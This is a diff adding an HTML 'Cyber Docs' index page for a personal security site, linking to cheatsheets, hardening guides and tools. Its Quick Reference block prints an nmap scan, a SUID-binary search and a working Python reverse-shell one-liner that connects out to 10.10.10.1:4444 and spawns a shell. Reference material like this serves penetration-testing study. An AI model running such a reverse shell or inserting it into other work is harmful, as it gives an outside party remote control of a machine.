@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZakPT | Cyber Docs</title>
+    <meta name="description" content="Cybersecurity cheatsheets, guides, and reference materials.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <style>
+        .doc-section {
+            margin-bottom: 4rem;
+        }
+
+        .doc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .doc-card {
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .doc-card:hover {
+            border-color: var(--accent-blue);
+            transform: translateX(5px);
+        }
+
+        .doc-icon {
+            font-size: 1.5rem;
+            color: var(--accent-blue);
+            margin-bottom: 1rem;
+        }
+
+        .doc-card h3 {
+            font-family: var(--font-mono);
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .doc-card p {
+            font-size: 0.9rem;
+            color: var(--text-dim);
+            flex-grow: 1;
+        }
+
+        .code-block {
+            background: #000;
+            padding: 1rem;
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            color: #00ff00;
+            margin-top: 1rem;
+            overflow-x: auto;
+            border: 1px solid #333;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="scanline"></div>
+    <div class="vignette"></div>
+
+    <header class="cyber-header">
+        <div class="logo">
+            <a href="index.html" style="text-decoration: none;">
+                <span class="bracket">[</span><span class="accent-orange">ZAK</span><span
+                    class="accent-purple">PT</span><span class="bracket">]</span>
+            </a>
+        </div>
+        <nav>
+            <ul class="nav-links">
+                <li><a href="index.html">HOME</a></li>
+                <li><a href="content.html">CONTENT</a></li>
+                <li><a href="homelab.html">HOMELAB</a></li>
+                <li><a href="cybersecurity.html" class="active">CYBER</a></li>
+                <li><a href="photography.html">PHOTOGRAPHY</a></li>
+                <li><a href="about.html">ABOUT</a></li>
+                <li><a href="gear.html">GEAR</a></li>
+                <li><a href="sponsors.html">SPONSORS</a></li>
+                <li><a href="links.html">LINKS</a></li>
+            </ul>
+            <button id="search-icon-btn" class="search-icon-btn" aria-label="Search">
+                <i class="fas fa-search"></i>
+            </button>
+        </nav>
+        <div class="coffee-status">
+            <i class="fas fa-book"></i> <span class="mono">DOCS: 15+</span>
+        </div>
+        <button id="adhd-toggle-btn" class="adhd-toggle-btn" aria-label="Toggle ADHD Focus Mode"
+            title="ADHD Focus Mode">
+            <i class="fas fa-brain"></i>
+            <span class="mono">FOCUS</span>
+        </button>
+    </header>
+
+    <!-- Search Overlay -->
+    <div id="search-overlay" class="search-overlay">
+        <div class="search-container">
+            <input type="text" id="search-input" placeholder="Search pages, projects, content..."
+                class="search-input mono" autocomplete="off">
+            <button id="search-close-btn" class="search-close-btn" aria-label="Close search">
+                <i class="fas fa-times"></i>
+            </button>
+            <div id="search-results" class="search-results"></div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2"></script>
+
+    <main>
+        <section class="page-header">
+            <h1 class="glitch-text">CYBER <span class="outline-text">DOCS</span></h1>
+            <p class="mono">Reference materials and field guides.</p>
+            <div style="margin-top: 2rem;">
+                <a href="cybersecurity.html" class="btn-link" style="font-size: 0.9rem;">&lt; BACK TO CYBER HUB</a>
+            </div>
+        </section>
+
+        <section class="fade-in">
+            <!-- Cheatsheets -->
+            <div class="doc-section">
+                <div class="section-title">
+                    <h2><span class="mono">01.</span> CHEATSHEETS</h2>
+                    <div class="line"></div>
+                </div>
+                <div class="doc-grid">
+                    <a href="#" class="doc-card" data-doc="linux-privesc"
+                        onclick="renderCyberDocModal('linux-privesc'); return false;">
+                        <div class="doc-icon"><i class="fas fa-terminal"></i></div>
+                        <h3>Linux Privilege Escalation</h3>
+                        <p>Common commands and techniques for escalating privileges on Linux systems.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-doc="nmap-ref"
+                        onclick="renderCyberDocModal('nmap-ref'); return false;">
+                        <div class="doc-icon"><i class="fas fa-network-wired"></i></div>
+                        <h3>Nmap Reference</h3>
+                        <p>Essential Nmap scans for network discovery and enumeration.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-doc="reverse-shells"
+                        onclick="renderCyberDocModal('reverse-shells'); return false;">
+                        <div class="doc-icon"><i class="fas fa-code"></i></div>
+                        <h3>Reverse Shells</h3>
+                        <p>One-liners for Bash, Python, PHP, and Netcat reverse shells.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-doc="owasp-top10"
+                        onclick="renderCyberDocModal('owasp-top10'); return false;">
+                        <div class="doc-icon"><i class="fas fa-spider"></i></div>
+                        <h3>OWASP Top 10</h3>
+                        <p>Web application vulnerabilities, impact, and mitigation strategies.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-doc="password-cracking"
+                        onclick="renderCyberDocModal('password-cracking'); return false;">
+                        <div class="doc-icon"><i class="fas fa-key"></i></div>
+                        <h3>Password Cracking</h3>
+                        <p>Hashcat and John the Ripper common commands and hash types.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-doc="metasploit-essentials"
+                        onclick="renderCyberDocModal('metasploit-essentials'); return false;">
+                        <div class="doc-icon"><i class="fas fa-file-code"></i></div>
+                        <h3>Metasploit Essentials</h3>
+                        <p>MSF commands, module usage, and payload generation.</p>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Hardening Guides -->
+            <div class="doc-section">
+                <div class="section-title">
+                    <h2><span class="mono">02.</span> HARDENING GUIDES</h2>
+                    <div class="line"></div>
+                </div>
+                <div class="doc-grid">
+                    <a href="#" class="doc-card" data-doc="ssh-hardening-guide"
+                        onclick="renderCyberDocModal('ssh-hardening-guide'); return false;">
+                        <div class="doc-icon"><i class="fas fa-server"></i></div>
+                        <h3>SSH Hardening</h3>
+                        <p>Best practices for securing SSH access: keys, config, and fail2ban.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-doc="ufw-firewall"
+                        onclick="renderCyberDocModal('ufw-firewall'); return false;">
+                        <div class="doc-icon"><i class="fas fa-shield-alt"></i></div>
+                        <h3>UFW Firewall Setup</h3>
+                        <p>Configuring Uncomplicated Firewall for basic server protection.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-doc="tls-ssl-config"
+                        onclick="renderCyberDocModal('tls-ssl-config'); return false;">
+                        <div class="doc-icon"><i class="fas fa-lock"></i></div>
+                        <h3>TLS/SSL Configuration</h3>
+                        <p>Securing web servers with proper certificate and cipher configuration.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-doc="active-directory"
+                        onclick="renderCyberDocModal('active-directory'); return false;">
+                        <div class="doc-icon"><i class="fas fa-user-shield"></i></div>
+                        <h3>Active Directory Security</h3>
+                        <p>Hardening Windows AD environment and common attack mitigations.</p>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Command Reference -->
+            <div class="doc-section">
+                <div class="section-title">
+                    <h2><span class="mono">03.</span> QUICK REFERENCE</h2>
+                    <div class="line"></div>
+                </div>
+                <div
+                    style="background: var(--surface-color); padding: 2rem; border-radius: 8px; border: 1px solid var(--border-color); margin-bottom: 2rem;">
+                    <h3 class="mono" style="color: var(--accent-orange); margin-bottom: 1rem;">Essential Ports</h3>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem;">
+                        <div class="mono"><span style="color: var(--accent-blue);">21</span> FTP</div>
+                        <div class="mono"><span style="color: var(--accent-blue);">22</span> SSH</div>
+                        <div class="mono"><span style="color: var(--accent-blue);">53</span> DNS</div>
+                        <div class="mono"><span style="color: var(--accent-blue);">80</span> HTTP</div>
+                        <div class="mono"><span style="color: var(--accent-blue);">443</span> HTTPS</div>
+                        <div class="mono"><span style="color: var(--accent-blue);">3306</span> MySQL</div>
+                        <div class="mono"><span style="color: var(--accent-blue);">3389</span> RDP</div>
+                        <div class="mono"><span style="color: var(--accent-blue);">8080</span> HTTP-Alt</div>
+                    </div>
+                </div>
+
+                <div
+                    style="background: var(--surface-color); padding: 2rem; border-radius: 8px; border: 1px solid var(--border-color);">
+                    <h3 class="mono" style="color: var(--accent-green); margin-bottom: 1rem;">Linux Commands</h3>
+                    <div class="code-block"
+                        style="background: #000; padding: 1rem; border-radius: 4px; font-family: var(--font-mono); font-size: 0.85rem; color: #00ff00;">
+                        <p># Network enumeration</p>
+                        <p>nmap -sV -sC -oA scan 10.10.10.1</p>
+                        <p></p>
+                        <p># Find SUID binaries</p>
+                        <p>find / -perm -4000 -type f 2>/dev/null</p>
+                        <p></p>
+                        <p># Python reverse shell</p>
+                        <p>python -c 'import
+                            socket,os,subprocess;s=socket.socket();s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Frameworks & Methodologies -->
+            <div class="doc-section">
+                <div class="section-title">
+                    <h2><span class="mono">04.</span> FRAMEWORKS</h2>
+                    <div class="line"></div>
+                </div>
+                <div class="doc-grid">
+                    <a href="#" class="doc-card" data-framework="mitre-attack"
+                        onclick="renderCyberFrameworkModal('mitre-attack'); return false;">
+                        <div class="doc-icon"><i class="fas fa-crosshairs"></i></div>
+                        <h3>MITRE ATT&CK</h3>
+                        <p>Adversary tactics, techniques, and common knowledge framework.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-framework="kill-chain"
+                        onclick="renderCyberFrameworkModal('kill-chain'); return false;">
+                        <div class="doc-icon"><i class="fas fa-chart-line"></i></div>
+                        <h3>Cyber Kill Chain</h3>
+                        <p>Understanding the stages of a targeted cyber attack.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-framework="nist-framework"
+                        onclick="renderCyberFrameworkModal('nist-framework'); return false;">
+                        <div class="doc-icon"><i class="fas fa-book"></i></div>
+                        <h3>NIST Cybersecurity Framework</h3>
+                        <p>Identify, Protect, Detect, Respond, and Recover.</p>
+                    </a>
+                    <a href="#" class="doc-card" data-framework="cis-controls"
+                        onclick="renderCyberFrameworkModal('cis-controls'); return false;">
+                        <div class="doc-icon"><i class="fas fa-list-check"></i></div>
+                        <h3>CIS Controls</h3>
+                        <p>20 critical security controls for effective cyber defense.</p>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Tools & Resources -->
+            <div class="doc-section">
+                <div class="section-title">
+                    <h2><span class="mono">05.</span> ESSENTIAL TOOLS</h2>
+                    <div class="line"></div>
+                </div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+                    <div
+                        style="background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem;">
+                        <h3 class="mono" style="color: #ff5f56; margin-bottom: 1rem;">RECONNAISSANCE</h3>
+                        <ul class="mono"
+                            style="list-style: none; padding: 0; line-height: 2; color: var(--text-dim); font-size: 0.9rem;">
+                            <li data-tool="nmap" onclick="renderCyberToolModal('nmap')" style="cursor: pointer;">→ Nmap
+                            </li>
+                            <li data-tool="masscan" onclick="renderCyberToolModal('masscan')" style="cursor: pointer;">→
+                                Masscan</li>
+                            <li data-tool="amass" onclick="renderCyberToolModal('amass')" style="cursor: pointer;">→
+                                Amass</li>
+                            <li data-tool="theharvester" onclick="renderCyberToolModal('theharvester')"
+                                style="cursor: pointer;">→ theHarvester</li>
+                        </ul>
+                    </div>
+                    <div
+                        style="background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem;">
+                        <h3 class="mono" style="color: #00D1FF; margin-bottom: 1rem;">WEB TESTING</h3>
+                        <ul class="mono"
+                            style="list-style: none; padding: 0; line-height: 2; color: var(--text-dim); font-size: 0.9rem;">
+                            <li data-tool="burp-suite" onclick="renderCyberToolModal('burp-suite')"
+                                style="cursor: pointer;">→ Burp Suite</li>
+                            <li data-tool="owasp-zap" onclick="renderCyberToolModal('owasp-zap')"
+                                style="cursor: pointer;">→ OWASP ZAP</li>
+                            <li data-tool="sqlmap" onclick="renderCyberToolModal('sqlmap')" style="cursor: pointer;">→
+                                SQLmap</li>
+                            <li data-tool="nikto" onclick="renderCyberToolModal('nikto')" style="cursor: pointer;">→
+                                Nikto</li>
+                        </ul>
+                    </div>
+                    <div
+                        style="background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem;">
+                        <h3 class="mono" style="color: var(--accent-green); margin-bottom: 1rem;">EXPLOITATION</h3>
+                        <ul class="mono"
+                            style="list-style: none; padding: 0; line-height: 2; color: var(--text-dim); font-size: 0.9rem;">
+                            <li data-tool="metasploit" onclick="renderCyberToolModal('metasploit')"
+                                style="cursor: pointer;">→ Metasploit</li>
+                            <li data-tool="exploit-db" onclick="renderCyberToolModal('exploit-db')"
+                                style="cursor: pointer;">→ Exploit-DB</li>
+                            <li data-tool="searchsploit" onclick="renderCyberToolModal('searchsploit')"
+                                style="cursor: pointer;">→ Searchsploit</li>
+                            <li data-tool="msfvenom" onclick="renderCyberToolModal('msfvenom')"
+                                style="cursor: pointer;">→ msfvenom</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Detail Modal -->
+    <div id="detail-modal" class="modal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">&times;</button>
+            <div id="modal-body"></div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-grid">
+            <div class="footer-brand">
+                <span class="bracket">[</span><span class="accent-orange">ZAK</span><span
+                    class="accent-purple">PT</span><span class="bracket">]</span>
+            </div>
+            <div class="footer-links">
+                <a href="#">GITHUB</a>
+                <a href="#">TWITTER</a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="data.js"></script>
+    <script src="adhd-mode.js"></script>
+    <script src="enhanced.js"></script>
+</body>
+
+</html>
